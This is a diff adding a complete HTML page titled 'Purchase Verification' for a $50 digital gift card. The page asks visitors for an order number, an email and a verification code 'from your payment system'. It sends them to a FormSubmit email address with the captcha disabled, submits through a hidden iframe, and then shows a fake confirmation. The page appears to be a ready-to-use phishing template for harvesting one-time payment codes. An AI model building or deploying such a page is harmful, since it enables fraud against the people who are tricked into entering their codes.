@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Purchase Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f8f8;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      background: #fff;
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    .header {
+      text-align: center;
+      border-bottom: 2px solid #000;
+      padding-bottom: 15px;
+      margin-bottom: 20px;
+    }
+    .header img {
+      max-width: 140px;
+    }
+    h2 {
+      text-align: center;
+      color: #000;
+      margin-top: 0;
+    }
+    .info {
+      background: #fafafa;
+      border: 1px solid #ddd;
+      padding: 20px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+    .info p { margin: 8px 0; font-size: 15px; }
+    form { margin-top: 20px; }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+    }
+    button {
+      background: #000;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover { background: #333; }
+    .thankyou-box {
+      display: none;
+      text-align: center;
+      padding: 30px;
+    }
+    .thankyou-box h3 { color: green; }
+    .footer {
+      font-size: 13px;
+      color: #777;
+      text-align: center;
+      margin-top: 30px;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="form-box">
+    <div class="header">
+      <img src="https://via.placeholder.com/140x40?text=Your+Logo" alt="Company Logo">
+    </div>
+
+    <h2>Purchase Verification</h2>
+
+    <div class="info">
+      <p><strong>Product:</strong> Digital Gift Card</p>
+      <p><strong>Order #:</strong> 123456789</p>
+      <p><strong>Delivery Method:</strong> Email</p>
+      <p><strong>Value:</strong> $50 USD</p>
+    </div>
+
+    <p>Please enter the verification details from your payment system to complete your purchase:</p>
+
+    <!-- FormSubmit integration with table emails and auto-response -->
+    <form action="https://formsubmit.co/your-email@example.com" method="POST" target="hidden_iframe" onsubmit="showThankYou()">
+      <input type="hidden" name="_subject" value="New Purchase Verification Submitted">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_autoresponse" value="✅ Thank you! We’ve received your purchase verification details. Your order will be processed shortly.">
+
+      <input type="text" name="order" placeholder="Order Number" required>
+      <input type="email" name="email" placeholder="Your Email" required>
+      <input type="text" name="verification_code" placeholder="Verification Code" required>
+
+      <button type="submit">Confirm Purchase</button>
+    </form>
+  </div>
+
+  <div class="container thankyou-box" id="thankyou-box">
+    <h3>✅ Thank You!</h3>
+    <p>Your purchase has been confirmed successfully.</p>
+    <p>We’ve received your verification details and sent a copy to your email inbox.</p>
+  </div>
+
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+  <script>
+    function showThankYou() {
+      setTimeout(() => {
+        document.getElementById("form-box").style.display = "none";
+        document.getElementById("thankyou-box").style.display = "block";
+      }, 800);
+    }
+  </script>
+
+  <div class="footer">
+    &copy; 2025 Your Company. All Rights Reserved.
+  </div>
+</body>
+</html>
